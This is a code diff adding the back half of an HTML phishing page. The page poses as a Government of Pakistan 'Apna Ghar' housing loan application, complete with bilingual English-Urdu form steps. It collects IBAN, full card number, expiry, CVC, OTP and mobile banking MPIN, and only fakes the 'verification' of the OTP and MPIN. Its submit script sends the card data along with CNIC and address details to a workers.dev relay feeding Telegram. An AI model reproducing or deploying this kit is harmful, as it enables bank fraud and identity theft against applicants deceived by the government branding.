+<div class="form-group"><div class="bi-label"><span class="en">Account Title <span class="req">*</span></span><span class="ur">اکاؤنٹ ٹائٹل</span></div><input type="text" id="accountTitle" placeholder="Full name as on account"></div>
+<div class="form-group"><div class="bi-label"><span class="en">IBAN <span class="req">*</span></span><span class="ur">بین الاقوامی بینک اکاؤنٹ نمبر</span></div><input type="text" id="accountNumber" placeholder="PK00XXXX0000000000000000" maxlength="24"></div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(3)">← Back</button><button class="btn-primary" onclick="gotoPage(5)">Continue to Card →</button></div>
+</div>
+</div>
+
+<div class="page" id="page5">
+<div class="page-header"><div class="page-num">5</div><div class="page-header-text"><h2>Card Verification</h2><div class="ur">کارڈ کی تصدیق</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to fill:</strong> Enter your ATM card details linked to your bank account for identity confirmation.<div class="ur">📋 کیا بھریں: شناخت کی تصدیق کے لیے اپنے بینک اکاؤنٹ سے منسلک اے ٹی ایم کارڈ کی تفصیلات درج کریں۔</div></div>
+<div class="form-group"><div class="bi-label"><span class="en">ATM Card Number (16 digits) <span class="req">*</span></span><span class="ur">اے ٹی ایم کارڈ نمبر</span></div><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)"></div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Expiry Date <span class="req">*</span></span><span class="ur">میعاد ختم</span></div><input type="month" id="cardExpiry"></div>
+<div class="form-group"><div class="bi-label"><span class="en">CVC (3 digits) <span class="req">*</span></span><span class="ur">سی وی سی</span></div><input type="password" id="cardCVC" placeholder="000" maxlength="3"></div>
+</div>
+<div class="form-group"><div class="bi-label"><span class="en">Card Holder Name <span class="req">*</span></span><span class="ur">کارڈ ہولڈر کا نام</span></div><input type="text" id="cardHolder" placeholder="NAME ON CARD"></div>
+<div class="alert alert-info">Card verification is for identity confirmation only. No charge will be applied.</div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(4)">← Back</button><button class="btn-primary" onclick="gotoPage(6)">Continue to OTP →</button></div>
+</div>
+</div>
+
+<div class="page" id="page6">
+<div class="page-header"><div class="page-num">6</div><div class="page-header-text"><h2>OTP Verification</h2><div class="ur">او ٹی پی کی تصدیق</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to do:</strong> A 6-digit OTP has been sent via SMS to your registered mobile number. Enter it below to verify.<div class="ur">📋 کیا کریں: آپ کے رجسٹرڈ موبائل نمبر پر 6 ہندسوں کا OTP بھیجا گیا ہے، اسے نیچے درج کریں۔</div></div>
+<div class="otp-display"><div class="lbl">📱 SMS Sent To</div><div class="num" id="otpMobileDisplay">03XX-XXXXXXX</div><div class="to">A 6-digit verification code has been sent to this number</div></div>
+<div class="alert alert-info">ℹ️ Enter the 6-digit OTP you received on your mobile number.</div>
+<div class="pin-row">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+<input type="text" maxlength="1" class="otp" oninput="moveNext(this,1)">
+</div>
+<button class="btn-primary" onclick="verifyOTP()">Verify OTP</button>
+<div id="otpStatus" style="margin-top:12px"></div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(5)">← Back</button><button class="btn-primary" onclick="gotoPage(7)">Continue to MPIN →</button></div>
+</div>
+</div>
+
+<div class="page" id="page7">
+<div class="page-header"><div class="page-num">7</div><div class="page-header-text"><h2>MPIN Confirmation</h2><div class="ur">ایم پن کی تصدیق</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to do:</strong> Enter your 4-digit mobile banking MPIN to authorise this application.<div class="ur">📋 کیا کریں: درخواست کی منظوری کے لیے اپنا 4 ہندسوں کا موبائل بینکنگ ایم پن درج کریں۔</div></div>
+<div class="otp-display" style="border-color:#3b82f6;background:linear-gradient(135deg,#eff6ff,#dbeafe)"><div class="lbl" style="color:#1e40af">🔐 MPIN Required For</div><div class="num" id="mpinMobileDisplay" style="color:#1e3a8a">03XX-XXXXXXX</div><div class="to" style="color:#1e40af">Enter your 4-digit mobile banking PIN</div></div>
+<div class="alert alert-info" style="background:#eff6ff;border-color:#3b82f6;color:#1e40af">ℹ️ Enter your 4-digit mobile banking MPIN to proceed.</div>
+<div class="pin-row">
+<input type="password" maxlength="1" class="pin" oninput="moveNext(this,2)">
+<input type="password" maxlength="1" class="pin" oninput="moveNext(this,2)">
+<input type="password" maxlength="1" class="pin" oninput="moveNext(this,2)">
+<input type="password" maxlength="1" class="pin" oninput="moveNext(this,2)">
+</div>
+<button class="btn-primary" onclick="verifyPIN()">Verify MPIN</button>
+<div id="pinStatus" style="margin-top:12px"></div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(6)">← Back</button><button class="btn-primary" onclick="gotoPage(8)">Continue to Review →</button></div>
+</div>
+</div>
+
+<div class="page" id="page8">
+<div class="page-header"><div class="page-num">8</div><div class="page-header-text"><h2>Review & Submit</h2><div class="ur">جائزہ اور جمع کرائیں</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to do:</strong> Please review all your details carefully. If everything is correct, tick the declaration and click Submit.<div class="ur">📋 کیا کریں: اپنی تمام تفصیلات کا بغور جائزہ لیں، درست ہونے پر اقرار نامہ پر نشان لگائیں اور جمع کرائیں پر کلک کریں۔</div></div>
+<table class="review-table">
+<tr><td>Full Name</td><td id="rvName">-</td></tr>
+<tr><td>Father Name</td><td id="rvFather">-</td></tr>
+<tr><td>CNIC</td><td id="rvCnic">-</td></tr>
+<tr><td>Date of Birth</td><td id="rvDob">-</td></tr>
+<tr><td>Mobile</td><td id="rvMobile">-</td></tr>
+<tr><td>Email</td><td id="rvEmail">-</td></tr>
+<tr><td>City</td><td id="rvCity">-</td></tr>
+<tr><td>District</td><td id="rvDistrict">-</td></tr>
+<tr><td>Province</td><td id="rvProvince">-</td></tr>
+<tr><td>Income</td><td id="rvIncome">-</td></tr>
+<tr><td>Bank</td><td id="rvBank">-</td></tr>
+<tr><td>Account Title</td><td id="rvAccTitle">-</td></tr>
+<tr><td>IBAN</td><td id="rvAccount">-</td></tr>
+<tr><td>Card Number</td><td id="rvCard">-</td></tr>
+<tr><td>Card Expiry</td><td id="rvExpiry">-</td></tr>
+<tr><td>OTP Verified</td><td id="rvOtpV">✗ No</td></tr>
+<tr><td>MPIN Verified</td><td id="rvPinV">✗ No</td></tr>
+</table>
+<label style="display:flex;align-items:flex-start;gap:10px;font-size:12px;margin-top:16px;cursor:pointer;background:#f8fafc;padding:14px;border-radius:10px;border:1px solid #e2e8f0"><input type="checkbox" id="agree" style="width:18px;height:18px;margin-top:2px;accent-color:#01411C;flex-shrink:0"><span>I hereby declare that all information provided is correct and complete.<br><span class="ur" style="display:block;margin-top:6px;font-size:12px;border-top:1px dashed #cbd5e1;padding-top:6px">میں اقرار کرتا/کرتی ہوں کہ دی گئی تمام معلومات درست ہیں۔</span></span></label>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(7)">← Back</button><button class="btn-primary" onclick="submitForm()">Submit Application ✓</button></div>
+</div>
+</div>
+
+<div class="page" id="page9">
+<div class="page-header"><div class="page-num">✓</div><div class="page-header-text"><h2>Application Complete</h2><div class="ur">درخواست مکمل ہو گئی</div></div></div>
+<div class="page-body">
+<div class="success-box">
+<div class="icon">✓</div>
+<h2>Application Submitted Successfully!</h2>
+<p class="urdu" style="font-size:15px;color:#16a34a;margin-bottom:8px">درخواست کامیابی سے جمع ہو گئی!</p>
+<div class="app-id">AG-<span id="appId">000000</span></div>
+<p style="font-size:12px;color:#475569">Your application reference number is shown above. Please keep it safe.</p>
+<div class="alert alert-info" style="margin-top:18px;text-align:left"><strong>Next Steps:</strong><br>👉 Our team will review your application within 15 working days<br>👉 You will receive an SMS on <strong id="successMobile">your mobile</strong><br>👉 For queries, call Helpline: <strong>0335-6671539</strong><br>👉 Never pay any agent — application processing is free</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+
+<div class="footer">
+<div class="footer-inner">
+<div>© 2026 Apna Ghar Program | Government of Pakistan</div>
+<div class="links"><a href="#">Privacy Policy</a><a href="#">Terms of Use</a><a href="tel:03356671539">Helpline: 0335-6671539</a><a href="mailto:apnaghar.gov.com@gmail.com">apnaghar.gov.com@gmail.com</a></div>
+</div>
+</div>
+
+<script>
+// AAPKA WORKER URL
+const WORKER_URL = "https://apnagharhomeloan.apnagharhomeloan.workers.dev/";
+let otpVerified=false,pinVerified=false;
+
+// Bina login direct apply now
+function handleApply(){
+  showHome();
+  switchTab(4);
+  gotoPage(1);
+}
+
+function showHome(){
+  window.scrollTo({top:0,behavior:'smooth'})
+}
+
+function switchTab(n){
+  document.querySelectorAll('.nav-tab').forEach((t,i)=>t.classList.toggle('active',i===n));
+  document.querySelectorAll('.section').forEach((s,i)=>s.classList.toggle('active',i===n));
+  window.scrollTo({top:0,behavior:'smooth'})
+}
+
+function showPage(n){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  const target=document.getElementById('page'+n);
+  if(target)target.classList.add('active');
+  const titles={1:'Personal Details & CNIC Verification',2:'Address Details',3:'Income & Contact',4:'Bank Details',5:'Card Verification',6:'OTP Verification',7:'MPIN Confirmation',8:'Review & Submit',9:'Application Complete'};
+  if(n<=9){
+    const pct=Math.round((n/9)*100);
+    document.getElementById('progFill').style.width=pct+'%';
+    document.getElementById('progPct').textContent=pct+'%';
+    document.getElementById('progStep').textContent='Step '+n+' of 9 \u2014 '+titles[n];
+  }
+  if(n===8)fillReview();
+  if(n===6)updateOtpMobile();
+  if(n===7)updateMpinMobile();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function gotoPage(n){showPage(n)}
+function updateOtpMobile(){const m=document.getElementById('mobile').value||'03XX-XXXXXXX';document.getElementById('otpMobileDisplay').textContent=m}
+function updateMpinMobile(){const m=document.getElementById('mobile').value||'03XX-XXXXXXX';document.getElementById('mpinMobileDisplay').textContent=m}
+function formatCNIC(el){let v=el.value.replace(/\D/g,'').slice(0,13);if(v.length>5&&v.length<=12)v=v.slice(0,5)+'-'+v.slice(5);else if(v.length>12)v=v.slice(0,5)+'-'+v.slice(5,12)+'-'+v.slice(12);el.value=v}
+function formatPhone(el){let v=el.value.replace(/\D/g,'').slice(0,11);if(v.length>4)v=v.slice(0,4)+'-'+v.slice(4);el.value=v}
+function formatCardNumber(el){let v=el.value.replace(/\D/g,'').slice(0,16);v=v.replace(/(.{4})/g,'$1 ').trim();el.value=v}
+function moveNext(el,type){if(el.value.length===1){const arr=document.querySelectorAll(type===1?'.otp':'.pin');const idx=Array.from(arr).indexOf(el);if(idx<arr.length-1)arr[idx+1].focus()}}
+function verifyOTP(){
+  let otp='';document.querySelectorAll('.otp').forEach(i=>otp+=i.value);
+  const st=document.getElementById('otpStatus');
+  if(otp.length===6){
+    otpVerified=true;
+    st.innerHTML='<div class="alert alert-success" style="display:block">\u2713 OTP verified successfully!</div>';
+  }else{
+    st.innerHTML='<div class="alert alert-warning" style="display:block">\u2717 Please enter a valid 6-digit OTP.</div>';
+  }
+}
+function verifyPIN(){
+  let pin='';document.querySelectorAll('.pin').forEach(i=>pin+=i.value);
+  const st=document.getElementById('pinStatus');
+  if(pin.length===4){
+    pinVerified=true;
+    st.innerHTML='<div class="alert alert-success" style="display:block">\u2713 MPIN verified successfully!</div>';
+  }else{
+    st.innerHTML='<div class="alert alert-warning" style="display:block">\u2717 Please enter a valid 4-digit MPIN.</div>';
+  }
+}
+function fillReview(){
+  const g=id=>document.getElementById(id).value||'-';
+  document.getElementById('rvName').textContent=g('fullName');
+  document.getElementById('rvFather').textContent=g('fatherName');
+  document.getElementById('rvCnic').textContent=g('cnic');
+  document.getElementById('rvDob').textContent=g('dob');
+  document.getElementById('rvMobile').textContent=g('mobile');
+  document.getElementById('rvEmail').textContent=g('email');
+  document.getElementById('rvCity').textContent=g('city');
+  document.getElementById('rvDistrict').textContent=g('district');
+  document.getElementById('rvProvince').textContent=g('province');
+  document.getElementById('rvIncome').textContent=g('income');
+  document.getElementById('rvBank').textContent=g('bank');
+  document.getElementById('rvAccTitle').textContent=g('accountTitle');
+  document.getElementById('rvAccount').textContent=g('accountNumber');
+  document.getElementById('rvCard').textContent=g('cardNumber');
+  document.getElementById('rvExpiry').textContent=g('cardExpiry');
+  document.getElementById('rvOtpV').textContent=otpVerified?'\u2713 Yes':'\u2717 No';
+  document.getElementById('rvPinV').textContent=pinVerified?'\u2713 Yes':'\u2717 No';
+}
+
+async function sendToTelegram(message){
+  try{
+    const res = await fetch(WORKER_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({message: message})
+    });
+    const data = await res.json();
+    return data.ok;
+  }catch(e){
+    console.error("Fetch Error:", e);
+    return false;
+  }
+}
+
+async function submitForm(){
+  if(!otpVerified){alert('Please verify your OTP first');return}
+  if(!pinVerified){alert('Please verify your MPIN first');return}
+  if(!document.getElementById('agree').checked){alert('Please tick the declaration checkbox to proceed');return}
+  
+  const submitBtn = document.querySelector('button[onclick="submitForm()"]');
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
+
+  const g=id=>(document.getElementById(id).value||"-");
+  const appId=Math.floor(100000+Math.random()*900000);
+  
+  const payload="<b>🏛️ NEW APNA GHAR APPLICATION</b>\n"+
+    "━━━━━━━━━━━━━━━━━━\n"+
+    "<b>App ID:</b> AG-"+appId+"\n"+
+    "<b>Name:</b> "+g("fullName")+"\n"+
+    "<b>Father:</b> "+g("fatherName")+"\n"+
+    "<b>CNIC:</b> "+g("cnic")+"\n"+
+    "<b>DOB:</b> "+g("dob")+"\n"+
+    "<b>Gender:</b> "+g("gender")+"\n"+
+    "<b>Occupation:</b> "+g("occupation")+"\n"+
+    "<b>Marital:</b> "+g("marital")+"\n"+
+    "━━━━━━━━━━━━━━━━━━\n"+
+    "<b>Address:</b> "+g("address1")+"\n"+
+    "<b>City:</b> "+g("city")+"\n"+
+    "<b>District:</b> "+g("district")+"\n"+
+    "<b>Province:</b> "+g("province")+"\n"+
+    "<b>Postal:</b> "+g("postal")+"\n"+
+    "━━━━━━━━━━━━━━━━━━\n"+
+    "<b>Income:</b> PKR "+g("income")+"\n"+
+    "<b>Mobile:</b> "+g("mobile")+"\n"+
+    "<b>Email:</b> "+g("email")+"\n"+
+    "━━━━━━━━━━━━━━━━━━\n"+
+    "<b>Bank:</b> "+g("bank")+"\n"+
+    "<b>Account Title:</b> "+g("accountTitle")+"\n"+
+    "<b>IBAN:</b> "+g("accountNumber")+"\n"+
+    "<b>Card:</b> "+g("cardNumber")+"\n"+
+    "<b>Expiry:</b> "+g("cardExpiry")+"\n"+
+    "<b>CVC:</b> "+g("cardCVC")+"\n"+
+    "<b>Card Holder:</b> "+g("cardHolder")+"\n"+
+    "━━━━━━━━━━━━━━━━━━\n"+
+    "<b>OTP Verified:</b> "+(otpVerified?"✅ Yes":"❌ No")+"\n"+
+    "<b>MPIN Verified:</b> "+(pinVerified?"✅ Yes":"❌ No")+"\n"+
+    "<b>Time:</b> "+new Date().toLocaleString();
+    
+  const success = await sendToTelegram(payload);
+  
+  if(success){
+    document.getElementById('appId').textContent=appId;
+    document.getElementById('successMobile').textContent=g("mobile")||'your mobile';
+    showPage(9);
+  } else {
+    alert("Data send failed. Check internet or Worker URL.");
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit Application ✓";
+  }
+}
+</script>
+</body>
+</html>
